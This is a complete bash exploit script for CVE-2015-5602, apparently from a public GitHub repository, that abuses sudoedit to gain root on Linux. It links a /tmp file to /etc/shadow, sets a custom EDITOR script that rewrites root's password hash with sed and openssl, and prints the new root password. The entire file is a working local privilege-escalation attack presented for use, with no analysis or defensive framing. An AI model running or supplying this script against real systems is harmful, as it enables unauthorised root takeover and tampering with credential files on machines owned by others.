#!/usr/bin/env bash
# CVE-2015-5602 exploit by t0kx
# https://github.com/t0kx/privesc-CVE-2015-5602

export EDITOR="/tmp/edit"
export FOLDER="${RANDOM}"
export PASSWD=$(printf ${RANDOM} \
		| md5sum \
		| awk '{print $1}')

prepare() {
cat << EOF >> /tmp/edit
#!/usr/bin/env bash
pass="$(printf "%q" $(openssl passwd -1 -salt ${RANDOM} ${PASSWD}))"
sed -i -e  "s,^root:[^:]\+:,root:\${pass}:," \${1}
EOF
}

main() {
	printf "[+] CVE-2015-5602 exploit by t0kx\n"
	printf "[+] Creating folder...\n"
	mkdir -p /tmp/${USER}/${FOLDER}/
	printf "[+] Creating symlink\n"
	ln -sf /etc/shadow /tmp/${USER}/${FOLDER}/esc.txt
	printf "[+] Modify EDITOR...\n"
	prepare && chmod +x ${EDITOR}
	printf "[+] Change root password to: ${PASSWD}\n"
	sudoedit /tmp/${USER}/${FOLDER}/esc.txt
	printf "[+] Done\n"
}; main